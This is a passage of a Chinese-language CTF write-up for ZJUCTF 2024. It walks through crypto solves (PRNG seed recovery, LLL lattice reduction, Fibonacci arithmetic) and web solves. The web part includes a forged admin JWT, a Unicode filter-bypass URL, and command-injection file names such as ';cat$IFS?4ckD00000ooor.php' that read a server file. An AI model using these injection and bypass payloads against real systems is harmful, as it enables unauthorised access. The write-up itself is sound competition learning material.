seed&quot;</span>)<br>reverseinit(random.getstate()[<span class="hljs-number">1</span>][:-<span class="hljs-number">1</span>])<br><span class="hljs-comment"># key = [3358881470, 2670804673, 4256210531, 4085415016, 2014628229, 2984896648, 2837766904, 534869515, 3396683863, 1732457832, 679200103, 2879791640, 4054140216, 3129555524, 1092970275, 3225866273, 1936024932, 7174432]</span><br>random.seed(<span class="hljs-string">b&#x27;ZJUCTF&#123;&#x27;</span>+<span class="hljs-string">b&quot;*&quot;</span>*<span class="hljs-number">72</span>+<span class="hljs-string">b&#x27;&#125;&#x27;</span>)<br><span class="hljs-built_in">print</span>(long_to_bytes(reverseinit(random.getstate()[<span class="hljs-number">1</span>][:-<span class="hljs-number">1</span>])))<br></code></pre></td></tr></table></figure></li><li>用fakeflag测试了下，发现可以，那就把题目中的文件随机数导入即可（注意如果用bytes array初始化那么keylist还要加上hash值）: <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> randcrack <span class="hljs-keyword">import</span> RandCrack<br><br>rc = RandCrack()<br>f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;./seed/leak&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> f.readlines():<br>    rc.submit(<span class="hljs-built_in">int</span>(i[:-<span class="hljs-number">1</span>],<span class="hljs-number">16</span>))<br>nowstate = [<span class="hljs-built_in">int</span>(<span class="hljs-string">&quot;&quot;</span>.join([<span class="hljs-built_in">str</span>(p) <span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> z]),<span class="hljs-number">2</span>) <span class="hljs-keyword">for</span> z <span class="hljs-keyword">in</span> rc.mt]<br>inistate = backtrace(backtrace(nowstate))<br><span class="hljs-built_in">print</span>(long_to_bytes(reverseinit(inistate)))<br></code></pre></td></tr></table></figure> <img src="/img/zjuctf2024/28.png"> <div class="note note-info">            <p>网上好像有现成破解seed的代码。。。</p>          </div></li></ul><h2 id="nsa">NSA</h2><ul><li><p>知道格基规约就能把这道题秒了，由于x和a的大小相差很大，那么就可以构造矩阵(记原<span class="math inline">\(s\ //\ n=t\)</span>): <span class="math display">\[  \begin{bmatrix}  x_1 &amp; x_2 &amp; x_3 &amp; x_4 &amp; x_5 &amp; t &amp; 1  \end{bmatrix}  \times  \begin{bmatrix}  1 &amp; 0 &amp; 0 &amp; 0 &amp; 0 &amp; 0 &amp; a_1 \\  0 &amp; 1 &amp; 0 &amp; 0 &amp; 0 &amp; 0 &amp; a_2 \\  0 &amp; 0 &amp; 1 &amp; 0 &amp; 0 &amp; 0 &amp; a_3 \\  0 &amp; 0 &amp; 0 &amp; 1 &amp; 0 &amp; 0 &amp; a_4 \\  0 &amp; 0 &amp; 0 &amp; 0 &amp; 1 &amp; 0 &amp; a_5 \\  0 &amp; 0 &amp; 0 &amp; 0 &amp; 0 &amp; 1 &amp; -n \\  0 &amp; 0 &amp; 0 &amp; 0 &amp; 0 &amp; 0 &amp; -s  \end{bmatrix}  \]</span></p></li><li><p>得到结果： <span class="math display">\[  \begin{bmatrix}  x_1 &amp; x_2 &amp; x_3 &amp; x_4 &amp; x_5 &amp; t &amp; 0  \end{bmatrix}  \]</span></p></li><li><p>由于结果的长度远小于矩阵中a,n,s的长度，直接对该矩阵进行格基规约，那么结果就可能是处理后矩阵的某一行: <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> secrets <span class="hljs-keyword">import</span> randbits<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> sha256<br><span class="hljs-keyword">from</span> sage.<span class="hljs-built_in">all</span> <span class="hljs-keyword">import</span> *<br>n = <span class="hljs-number">1973262420438951967320857357182009152091259685060976722964606060415762941212963496173787803818132496094383083809617106382186584091024192880722074907992491367450376544013030959022137871119305973124950248142047263035635704712183940295643931582521870194436601800272104155213299635342758552485316790832579867297150676449480377301711550092169821139312777545087931190076223860806667206368445038374040009303216695843074552565472224259513347471048389711982387187929358080134259118116803904926037703226659436288017803262824150053323837281123708147514697839476472493444001359537263470035147822515533236213306871187789861137864</span><br>s = <span class="hljs-number">25968545790292770927664439022039737990740822274703473845844930805491973210053546757650612526671426169052862599487679523347480169973953855077248798990354540626902441004340668118824647635652733202266038565469480686593639141386160897997041025319530312635817177211940935304195338733597108954253489362890509953008579795465614477856365008523630015461376982331314525043834068281293242866988185504701331075706296655857609737273305897051800777391003779592347329297992465517975455425494933095449106283240537673407217335317072671448690092359553841225872584507479466178655269973803840975113771278026055850135141677845388049546</span><br>a = [<span class="hljs-number">10408175307348227837634927663895071529476747502502185137513974921146145423682039533172426778936636358324323912788471069026035168778419976679080184413445271720845102618347963190848191065559646770751655277489531629085722243398071815514153232748524230263971369717467799896204740816910663354935597598214850905156314156887989538373959310497944747453576532357871371863075761014213384743918508858141163976218524522607305196842635916581744439316075721739180965470299311350393451063367829414121337156065063861518282124855164605728530156876267682012313606474074632758901489079434948149811390226852506471410549293073583094154314</span>, <span class="hljs-number">28269560384960198129459464824168904454093533799427373719101958152830149304079535609840503045418817577271339506559708826732505096765044117971395637414798033477281664349092452395201698366996248139565797081925288330110757163731306944864404131792462548050708767759391940119750713119508122181663178044139268149581082597178199687276079353808439331728293658408631700475635429921342830354715878323660002459279064928181750787407060944131659356624300053929897005824524609929688237355990980427613559070550439812162019187800018233621385797936453990170736247405871997771020602086874659014802758833220985543027634931320965118936782</span>, <span class="hljs-number">10625741788931007858303888830659148422354013378542985927696595777152340414854015279971842010883421053720353641812187868653213235312353892555970563177558988599107933633340735864486222364110270557367311389846076836771083415281846163998654380752623282253778094553911643806578968196883934713435987257460863616962447383892032157500229307681280131430912764656808726260928234722038626955873788364902558250972328382020856810352543862191220046884387107630101992556872008805981866862802982658955378648983437460740234334042235547472682932431773316024845941192812705881982892857027525142349379964285721568460303629823752967342887</span>, <span class="hljs-number">466513131390636645643900269891214946444047706245650824135253103614265978612953404725019381500993893845145617053401585161990958374796943199099538435861351496258557099896861385401969983387062345279712657806192329411762748881795342790969236194712072681142002072072680828453443357328016687844228861613794298560379205793274077841700937160925811964857910585432339248824064598338134101699312973992616278479768665180694250521743161214366283362781594396414837969921707567615116413598691531290859926550159099552968634136977992540573210466243951997484516747810672360389301753992051382855018984004441058675996738943205371672373</span>, <span class="hljs-number">30013758663076066877713479338691268354899117645445901521662513922052773749395722214090463347248196981868060239786749190266829133470588046958650363148592192357743453783999383200266694850576232013366482175580400126504924153112985830671791571729150276552617782355703038489520393441340713706112576543244470787929038348393779800947179266079330697886117577995873112270474905451612688195298847844226775663235117316316233884464539170131705812430540592713821720299545018169679141879516593359119078495699996765358693970850371204734231497643516531729414382001386014762945378114870937450813766645634470171843375886718590614087224</span>]<br>A = Matrix([<br>    [<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,a[<span class="hljs-number">0</span>]],<br>    [<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,a[<span class="hljs-number">1</span>]],<br>    [<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,a[<span class="hljs-number">2</span>]],<br>    [<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,a[<span class="hljs-number">3</span>]],<br>    [<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,a[<span class="hljs-number">4</span>]],<br>    [<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,-n],<br>    [<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,-s]<br>    ]<br>)<br>B = A.LLL()<br><span class="hljs-built_in">print</span>(B)<br>x = [i <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> B[<span class="hljs-number">0</span>][:<span class="hljs-number">5</span>]]<br>new_s = <span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>):<br>    ai = a[i]<br>    xi = x[i]<br>    new_s += ai * xi<br><span class="hljs-built_in">print</span>(new_s%n == s)<br>ans = sha256(<span class="hljs-string">&quot;&quot;</span>.join([<span class="hljs-built_in">str</span>(i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> x]).encode()).hexdigest()<br>flag = <span class="hljs-string">f&quot;ZJUCTF&#123;&#123;<span class="hljs-subst">&#123;ans&#125;</span>&#125;&#125;&quot;</span><br><span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure> <img src="/img/zjuctf2024/29.png"></p></li></ul><h2 id="fib1">fib1</h2><ul><li>根据题目<span class="math display">\[ f(n,p)= (F(n) \% p, F(n+1) \% p) \]</span> 只要利用好斐波那契数列的性质就可以解决；</li><li>知道 $ F(a+b) = F(b) F(a+1) + F(b-1) F(a)$ 就可以根据 $ f(a,p),f(b,p) $ 求 $ f(a+b,p) $；</li><li>知道 $F(2n) = F(n) ( 2F(n+1) - F(n) ) $ 和 $ F(2n+1) = F(n+1)^2 + F(n)^2 $ 快速倍增就可以根据 $ f(n,p) $ 求 $ f(k n,p) $；</li><li>由于 p 是质数，就可以逆向加法过程做减法; <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> is_prime,invert<br><br>io = remote(<span class="hljs-string">&quot;127.0.0.1&quot;</span>,<span class="hljs-number">62562</span>)<br><span class="hljs-comment"># context.log_level = &quot;debug&quot;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">fibadd</span>(<span class="hljs-params">fib1,fib2,p</span>):<br>    <span class="hljs-keyword">return</span> [(fib2[<span class="hljs-number">0</span>]*fib1[<span class="hljs-number">1</span>]+((fib2[<span class="hljs-number">1</span>]-fib2[<span class="hljs-number">0</span>])%p)*fib1[<span class="hljs-number">0</span>])%p,(fib2[<span class="hljs-number">1</span>]*fib1[<span class="hljs-number">1</span>]+fib2[<span class="hljs-number">0</span>]*fib1[<span class="hljs-number">0</span>])%p]<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">fibsub</span>(<span class="hljs-params">fib2,res,p</span>):<br>    fib1 = [<span class="hljs-number">0</span>,<span class="hljs-number">0</span>]<br>    <span class="hljs-keyword">assert</span> is_prime(p)<br>    tmp1 = (res[<span class="hljs-number">0</span>]*fib2[<span class="hljs-number">1</span>]-res[<span class="hljs-number">1</span>]*fib2[<span class="hljs-number">0</span>])%p<br>    tmp2 = (((fib2[<span class="hljs-number">1</span>]-fib2[<span class="hljs-number">0</span>])%p)*fib2[<span class="hljs-number">1</span>]-fib2[<span class="hljs-number">0</span>]*fib2[<span class="hljs-number">0</span>])%p<br>    fib1[<span class="hljs-number">0</span>] = (invert(tmp2,p)*tmp1)%p<br>    tmp1 = (res[<span class="hljs-number">0</span>]*fib2[<span class="hljs-number">0</span>]-res[<span class="hljs-number">1</span>]*((fib2[<span class="hljs-number">1</span>]-fib2[<span class="hljs-number">0</span>])%p))%p<br>    tmp2 = (fib2[<span class="hljs-number">0</span>]*fib2[<span class="hljs-number">0</span>]-fib2[<span class="hljs-number">1</span>]*((fib2[<span class="hljs-number">1</span>]-fib2[<span class="hljs-number">0</span>])%p))%p<br>    fib1[<span class="hljs-number">1</span>] = (invert(tmp2,p)*tmp1)%p<br>    <span class="hljs-keyword">return</span> fib1<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">fibmul2</span>(<span class="hljs-params">fib,p</span>):<br>    <span class="hljs-keyword">return</span> [(fib[<span class="hljs-number">0</span>]*(<span class="hljs-number">2</span>*fib[<span class="hljs-number">1</span>]-fib[<span class="hljs-number">0</span>]))%p,(<span class="hljs-built_in">pow</span>(fib[<span class="hljs-number">0</span>],<span class="hljs-number">2</span>,p)+<span class="hljs-built_in">pow</span>(fib[<span class="hljs-number">1</span>],<span class="hljs-number">2</span>,p))%p]<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">fibmulk</span>(<span class="hljs-params">fib,k,p</span>):<br>    res = [<span class="hljs-number">0</span>,<span class="hljs-number">1</span>]<br>    now = fib.copy()<br>    <span class="hljs-keyword">while</span> k!=<span class="hljs-number">0</span>:<br>        <span class="hljs-comment"># print(now,res,k,k%2)</span><br>        <span class="hljs-keyword">if</span> k%<span class="hljs-number">2</span>:<br>            res = fibadd(res,now,p)<br>        now = fibmul2(now,p)<br>        k = k&gt;&gt;<span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span> res<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;now running : <span class="hljs-subst">&#123;i+<span class="hljs-number">1</span>&#125;</span>&quot;</span>)<br>    io.recvuntil(<span class="hljs-string">f&quot;Round <span class="hljs-subst">&#123;i+<span class="hljs-number">1</span>&#125;</span>/10&quot;</span>.encode())<br>    io.recvuntil(<span class="hljs-string">b&quot;now you know:\n&quot;</span>)<br>    p = <span class="hljs-built_in">int</span>(io.recvline().decode(<span class="hljs-string">&quot;utf-8&quot;</span>)[<span class="hljs-built_in">len</span>(<span class="hljs-string">&quot;p = &quot;</span>):-<span class="hljs-number">1</span>])<br>    k = <span class="hljs-built_in">int</span>(io.recvline().decode(<span class="hljs-string">&quot;utf-8&quot;</span>)[<span class="hljs-built_in">len</span>(<span class="hljs-string">&quot;k = &quot;</span>):-<span class="hljs-number">1</span>])<br>    fib_a = [<span class="hljs-built_in">int</span>(i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> io.recvline().decode(<span class="hljs-string">&quot;utf-8&quot;</span>)[<span class="hljs-built_in">len</span>(<span class="hljs-string">&quot;fib(a, p) = (&quot;</span>):-<span class="hljs-number">2</span>].split(<span class="hljs-string">&quot;,&quot;</span>)]<br>    fib_b = [<span class="hljs-built_in">int</span>(i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> io.recvline().decode(<span class="hljs-string">&quot;utf-8&quot;</span>)[<span class="hljs-built_in">len</span>(<span class="hljs-string">&quot;fib(b, p) = (&quot;</span>):-<span class="hljs-number">2</span>].split(<span class="hljs-string">&quot;,&quot;</span>)]<br>    io.recv()<br>    fib_ab = fibadd(fib_a,fib_b,p)<br>    io.sendline(<span class="hljs-built_in">str</span>(fib_ab[<span class="hljs-number">0</span>]*p+fib_ab[<span class="hljs-number">1</span>]).encode())<br>    io.recv()<br>    fib_ak = fibmulk(fib_a,k,p)<br>    io.sendline(<span class="hljs-built_in">str</span>(fib_ak[<span class="hljs-number">0</span>]*p+fib_ak[<span class="hljs-number">1</span>]).encode())<br>    <span class="hljs-keyword">assert</span> fibadd(fibsub(fib_a,[<span class="hljs-number">0</span>,<span class="hljs-number">1</span>],p),fib_a,p)==[<span class="hljs-number">0</span>,<span class="hljs-number">1</span>]<br>    io.recv()<br>    fib_c = fibsub(fib_a,[<span class="hljs-number">0</span>,<span class="hljs-number">1</span>],p)<br>    io.sendline(<span class="hljs-built_in">str</span>(fib_c[<span class="hljs-number">0</span>]*p+fib_c[<span class="hljs-number">1</span>]).encode())<br><br>io.interactive()<br><br><span class="hljs-comment"># ZJUCTF&#123;fibonacci_sequence_mod_n_is_a_kind_of_group&#125;</span><br></code></pre></td></tr></table></figure> <img src="/img/zjuctf2024/33.png"></li></ul><h1 id="web"><strong>Web</strong></h1><p>还是不太会web的题目，有些题目都是网上有类似题解的🥲</p><h2 id="easy-pentest">easy pentest</h2><ul><li>从<a href="https://help.aliyun.com/zh/oss/developer-reference/install-ossutil?spm=a2c4g.11186623.0.0.79b841e607DL3S#concept-303829">阿里云</a>下载工具并根据题目文件配置： <img src="/img/zjuctf2024/3.png"></li><li>运行<code>./ossutil64 cp oss://oss-test-qazxsw/fffffflllllaaaagggg.txt ./</code>得到文件，flag是<code>flag&#123;99b87fa89d7e147c42e709dcd378e03e&#125;</code></li></ul><h2 id="easy-jwt">easy JWT</h2><ul><li>仔细看了代码，目标是输入token使得"role"变为"admin"，但是不知道secret，所以没法通过签名检测，我一直想着构造json.load来窃取secret，但是直到看到<a href="https://rwandi-ctf.github.io/LACTF2024/jason-web-token/">博客</a>发现只要输入很大的age就能使得salted_secret变为<code>inf</code>，于是可以通过检测： <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">import</span> json<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> time<br><br>secret = <span class="hljs-built_in">int</span>.from_bytes(os.urandom(<span class="hljs-number">128</span>), <span class="hljs-string">&quot;big&quot;</span>)<br>hash_ = <span class="hljs-keyword">lambda</span> a: hashlib.sha256(a.encode()).hexdigest()<br><br>data = <span class="hljs-string">&#x27;&#123;&quot;username&quot;: &quot;admin-owo&quot;, &quot;age&quot;: 1e1000, &quot;role&quot;: &quot;admin&quot;, &quot;timestamp&quot;: 1729240220&#125;&#x27;</span><br>userinfo = json.loads(data)<br>salted_secret = (secret ^ userinfo[<span class="hljs-string">&quot;timestamp&quot;</span>]) + userinfo[<span class="hljs-string">&quot;age&quot;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;data&#125;</span>:<span class="hljs-subst">&#123;salted_secret&#125;</span>&quot;</span>)<br><span class="hljs-built_in">print</span>(hash_(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;data&#125;</span>:<span class="hljs-subst">&#123;salted_secret&#125;</span>&quot;</span>))<br>signature = hash_(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;data&#125;</span>:<span class="hljs-subst">&#123;salted_secret&#125;</span>&quot;</span>)<br><br>payload = data.encode().<span class="hljs-built_in">hex</span>() + <span class="hljs-string">&quot;.&quot;</span> + signature<br><span class="hljs-built_in">print</span>(payload)<br><br><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&quot;http://55a4ef54.r23.cpolar.top/img&quot;</span>  <span class="hljs-comment">#内网穿透地址</span><br>cookies = &#123;<br>    <span class="hljs-string">&quot;token&quot;</span>: payload<br>&#125;<br>response = requests.get(url, cookies=cookies)<br><span class="hljs-built_in">print</span>(response.content)<br><span class="hljs-comment"># ZJUCTF&#123;COOKI3_dE$i9n_5HOU1d_fo1low_BEs7_PR@cT1Ce|5Ry_F0r_unExPeCT3D_s0lVe_T.T&#125;</span><br></code></pre></td></tr></table></figure> <img src="/img/zjuctf2024/22.png"></li></ul><h2 id="shanque">shanque</h2><ul><li>目标是在url的框内输入<code>http://here-is.your.flaaaaa4g.url</code>，但是代码对url进行了过滤，不能有重复字符，且不能有<code>here-is.your.flaaaaa4g.url</code>，于是就想到了unicode的特殊字符会被url正确解析: <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> unicodedata <span class="hljs-keyword">import</span> normalize<br><span class="hljs-keyword">from</span> collections <span class="hljs-keyword">import</span> defaultdict<br><br>target = <span class="hljs-string">&quot;http://here-is.your。flaaaaa4g。url&quot;</span><br><br>lst = <span class="hljs-built_in">list</span>(target)<br>dic = defaultdict(<span class="hljs-built_in">list</span>)<br><span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> lst:<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0x110000</span>):<br>        <span class="hljs-keyword">if</span> normalize(<span class="hljs-string">&quot;NFKC&quot;</span>, <span class="hljs-built_in">chr</span>(i)) == char:<br>            dic[char].append(<span class="hljs-built_in">chr</span>(i))<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(dic[char]) &gt; <span class="hljs-number">9</span>:<br>            <span class="hljs-keyword">break</span><br><span class="hljs-built_in">print</span>(dic)<br><br>res = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> target:<br>    res+=dic[i][<span class="hljs-number">1</span>]<br>    <span class="hljs-keyword">del</span> dic[i][<span class="hljs-number">1</span>]<br><span class="hljs-built_in">print</span>(res)<br></code></pre></td></tr></table></figure></li><li>在本地跑发现url前面五个字符不能为特殊字符，于是就想到了大小写绕过，构造出payload：<code>HtTp:ₕᵉʳₑ﹣ᵢſ．ʸºᵘᵣ｡ᶠˡªᵃₐⓐａ⁴ᵍ。ᵤⓡₗ</code> <img src="/img/zjuctf2024/43.png"></li></ul><h2 id="upload">upload</h2><ul><li>首先打开网页，发现被重定向到微信公众号，用burpsuite抓包，跳出一开始的网址重定向： <img src="/img/zjuctf2024/44.png"></li><li>发现有个upload界面，可以上传图片，通过更改文件名等手段，发现对文件类型的检测是由文件头决定的，跟文件名后缀无关，这时候到这就卡住了，因为就算上传木马图片也不知道图片路径，可能存到系统的某个文件夹下面，并不是在网页上可以访问的；</li><li>后来问了出题人，他让我多上传点不一样的图片试试，接着我就发现了可疑的地方，上传到某张图片时突然网页返回了<code>special char found in the file name.</code>，网页竟然检测了文件名，这就很匪夷所思。于是我不停的修改文件名，终于！<ul><li>正常的上传图片是这样的： <img src="/img/zjuctf2024/45.png"></li><li>文件名为空会报这个错: <img src="/img/zjuctf2024/46.png"></li><li>文件名为<code>/</code>会报这个错: <img src="/img/zjuctf2024/47.png"></li><li>文件名为<code>'</code>会返回空: <img src="/img/zjuctf2024/48.png"></li><li>为什么会返回空呢，难道执行了什么指令？是SQL/PHP，还是SHELL？于是我又尝试了各种文件名，直到输入<code>;ls</code>时发现竟然有结果： <img src="/img/zjuctf2024/49.png"></li></ul></li><li>看到了这道题的目标，就是拿到<code>b4ckD00000ooor.php</code>里面的内容，再梳理整个思路，猜测出题人是将这张图片存到了系统的某个地方，最后在网站上返回图片时，是用类似shell的指令读取了该路径的文件内容并进行base64编码再返回的;</li><li>但是出题人限制了空格，也限制了一对<code>$$</code>，也不能用<code>$IFS$9</code>绕过;</li><li>尝试多次后发现可以用通配符<code>?</code>绕过，使用<code>;cat$IFS?4ckD00000ooor.php</code>，拿到flag(ZJUCTF{Ye5_We1l_inj3C.t10N!!})： <img src="/img/zjuctf2024/50.png"></li></ul><h1 id="reverse"><strong>Reverse</strong></h1><p>会做的reverse题都算比较简单的送分题🫥</p><h2 id="rev1">rev1</h2><ul><li>打开亲爱的ida大人，看到关键比较代码（其中v9[i+27]是你输入的数据） <img src="/img/zjuctf2024/12.png"></li><li>那么简单了，打开gdb将断点设在比较语句，看寄存器内的值就行了。图方便我还用patch大法把return 0相关汇编改成了nop，这下错了也不会退出程序了: <img src="/img/zjuctf2024/13.png"> <img src="/img/zjuctf2024/14.png"></li><li>用gdb解出flag： <img src="/img/zjuctf2024/15.png"> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">li = [<span class="hljs-number">0x5a</span>,<span class="hljs-number">0x4a</span>,<span class="hljs-number">0x55</span>,<span class="hljs-number">0x43</span>,<span class="hljs-number">0x54</span>,<span class="hljs-number">0x46</span>,<span class="hljs-number">0x7b</span>,<span class="hljs-number">0x72</span>,<span class="hljs-number">0x65</span>,<span class="hljs-number">0x76</span>,<span class="hljs-number">0x5f</span>,<span class="hljs-number">0x69</span>,<span class="hljs-number">0x73</span>,<span class="hljs-number">0x5f</span>,<span class="hljs-number">0x66</span>,<span class="hljs-number">0x75</span>,<span class="hljs-number">0x6e</span>,<span class="hljs-number">0x5f</span>,<span class="hljs-number">0x72</span>,<span class="hljs-number">0x69</span>,<span class="hljs-number">0x67</span>,<span class="hljs-number">0x68</span>,<span class="hljs-number">0x74</span>,<span class="hljs-number">0x3f</span>,<span class="hljs-number">0x7d</span>]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> li:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(i),end=<span class="hljs-string">&quot;&quot;</span>)<br><br><span class="hljs-comment"># ZJUCTF&#123;rev_is_fun_right?&#125;</span><br></code></pre></td></tr></table></figure></li></ul><h2 id="rev2">rev2</h2><ul><li>放到ida里查看，其余都是简单的对列表内的值加加减减的操作并比较，关键在于das指令: <img src="/img/zjuctf2024/19.png"></li></ul>    <div class="fold">      <div class="fold-title fold-info collapsed" data-toggle="collapse" href="#collapse-6e7dedfa" role="button" aria-expanded="false" aria-controls="collapse-6e7dedfa">        <div class="fold-arrow">▶</div> das 的操作步骤      </div>      <div class="fold-collapse collapse" id="collapse-6e7dedfa">        <div class="fold-content">          <ul><li>目标场景：当你使用 SUB 指令对两个 BCD 数进行减法运算时，结果可能不是一个有效的 BCD 码。das 指令用于纠正这种情况。</li><li>调整规则：<ul><li>如果 AL（累加寄存器的低 8 位）中的低 4 位（即个位）大于 9，或者辅助进位标志（AF）置位，则 AL 减去 6，调整个位。</li><li>如果 AL 的高 4 位（即十位）大于 9，或者进位标志（CF）置位，则 AL 减去 0x60，调整十位。</li></ul></li></ul>        </div>      </div>    </div><ul><li>模拟AL的改变规则，编写脚本得到flag <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span 